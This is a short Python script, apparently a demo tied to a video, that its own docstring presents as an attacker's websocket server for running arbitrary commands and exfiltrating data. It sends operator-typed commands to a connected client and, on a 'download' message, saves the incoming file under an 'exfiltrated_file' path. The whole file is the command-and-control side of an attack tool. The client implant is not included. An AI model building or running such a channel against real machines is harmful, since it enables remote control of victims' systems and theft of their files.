"""
There is a video created for this file
Using websocket to creat a long-lived full-duplex asynchronous communication
The attacker can execute arbitrary commands + exfiltration
"""
import asyncio
import websockets

async def server(websocket):

    while True:
        message = input("Enter a message: ")
        await websocket.send(message)
        message = await websocket.recv()
        if message != 'download':
            print(f"Received message from client: {message}")
        elif message == 'download':
            try:
                with open("/exfiltrated_file/received_file.txt", "wb") as received_file:
                    while True:
                        data = await websocket.recv()
                        if not data:
                            received_file.close()
                            break
                        received_file.write(data)
            except:
                await websocket.send("File transfer error")

start_server = websockets.serve(server, "localhost", 8765)

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()

